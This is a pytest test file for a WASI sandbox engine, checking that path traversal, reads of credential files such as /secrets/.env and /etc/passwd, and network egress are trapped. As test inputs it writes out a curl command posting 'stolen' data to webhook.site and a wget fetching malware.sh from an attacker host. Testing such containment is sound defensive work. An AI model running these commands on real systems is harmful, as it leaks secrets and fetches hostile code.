"""Unit tests for Wasmer & WASI Runtime Containment Engine."""

import pytest
import wasmtime

from aegis.core.policy import (
    PathTraversalError,
    PolicyViolationType,
    STRICT_SANDBOX_POLICY,
    SecurityPolicy,
)
from aegis.core.sandbox import WasmerSandbox


def test_vfs_valid_operations():
    """Verify that file writes, reads, and directory listings work inside guest /workspace."""
    with WasmerSandbox() as sandbox:
        sandbox.write_vfs_file("test.txt", "Hello, WASI Sandbox!")
        content = sandbox.read_vfs_file("test.txt")
        assert content == "Hello, WASI Sandbox!"

        # Explicit /workspace prefix
        content2 = sandbox.read_vfs_file("/workspace/test.txt")
        assert content2 == "Hello, WASI Sandbox!"

        # Directory listing
        files = sandbox.list_vfs_dir("/workspace")
        assert "test.txt" in files


def test_vfs_traversal_prevention_parent_dirs():
    """Verify that unauthorized path traversal via '../' fails deterministically."""
    with WasmerSandbox() as sandbox:
        with pytest.raises(PathTraversalError):
            sandbox.read_vfs_file("../host_secret.txt")

        with pytest.raises(PathTraversalError):
            sandbox.read_vfs_file("sub/../../escaped.txt")

        with pytest.raises(PathTraversalError):
            sandbox.write_vfs_file("../evil.sh", "echo owned")


def test_vfs_traversal_prevention_root_paths():
    """Verify that attempts to read unmapped host root paths (e.g. /etc, /secrets) fail."""
    with WasmerSandbox() as sandbox:
        with pytest.raises(PathTraversalError):
            sandbox.read_vfs_file("/secrets/.env")

        with pytest.raises(PathTraversalError):
            sandbox.read_vfs_file("/etc/passwd")

        with pytest.raises(PathTraversalError):
            sandbox.read_vfs_file("C:\\Windows\\System32\\calc.exe")


def test_sandbox_command_traversal_trapped():
    """Verify that command-level path traversal attempts are trapped and logged as policy violations."""
    with WasmerSandbox() as sandbox:
        # Command attempting to read host secret
        result = sandbox.execute_command("cat /secrets/.env")
        assert result.trapped is True
        assert result.exit_code != 0
        assert "wasi_snapshot_preview1:path_open" in (result.blocked_syscall or "")
        assert any(v.violation_type == PolicyViolationType.FILE_SYSTEM_TRAVERSAL for v in result.violations)

        # Command attempting parent directory traversal
        result2 = sandbox.execute_command("cat ../../sensitive.key")
        assert result2.trapped is True
        assert any(v.violation_type == PolicyViolationType.FILE_SYSTEM_TRAVERSAL for v in result2.violations)


def test_sandbox_network_egress_blocked():
    """Verify that network commands and URLs are intercepted and blocked when allow_net is False."""
    with WasmerSandbox(policy=STRICT_SANDBOX_POLICY) as sandbox:
        result = sandbox.execute_command("curl -X POST https://webhook.site/exfil -d 'stolen'")
        assert result.trapped is True
        assert result.exit_code == 126
        assert result.blocked_syscall == "wasi_snapshot_preview1:sock_open"
        assert any(v.violation_type == PolicyViolationType.NETWORK_EGRESS_ATTEMPT for v in result.violations)

        result_wget = sandbox.execute_command("wget http://attacker.invalid/malware.sh")
        assert result_wget.trapped is True
        assert any(v.violation_type == PolicyViolationType.NETWORK_EGRESS_ATTEMPT for v in result_wget.violations)


def test_sandbox_in_memory_command_execution():
    """Verify that authorized in-sandbox commands execute cleanly without host subshell side-effects."""
    with WasmerSandbox() as sandbox:
        sandbox.write_vfs_file("data.txt", "line1\nline2\nline3")

        # cat and grep pipe
        result = sandbox.execute_command("cat data.txt | grep line2")
        assert result.trapped is False
        assert result.exit_code == 0
        assert result.stdout.strip() == "line2"

        # base64 roundtrip
        result_b64 = sandbox.execute_command("echo hello | base64")
        assert result_b64.exit_code == 0
        encoded = result_b64.stdout.strip()
        assert encoded == "aGVsbG8="


def test_wasm_bytecode_execution():
    """Verify execution of WebAssembly bytecode with WASI proc_exit."""
    wat = """
    (module
      (import "wasi_snapshot_preview1" "proc_exit" (func $exit (param i32)))
      (memory (export "memory") 1)
      (func (export "_start")
        (call $exit (i32.const 0))
      )
    )
    """
    wasm_bytes = wasmtime.wat2wasm(wat)

    with WasmerSandbox() as sandbox:
        result = sandbox.execute_wasm(wasm_bytes, args=["test_prog"])
        assert result.exit_code == 0
        assert result.trapped is False
        assert result.duration_ms >= 0.0
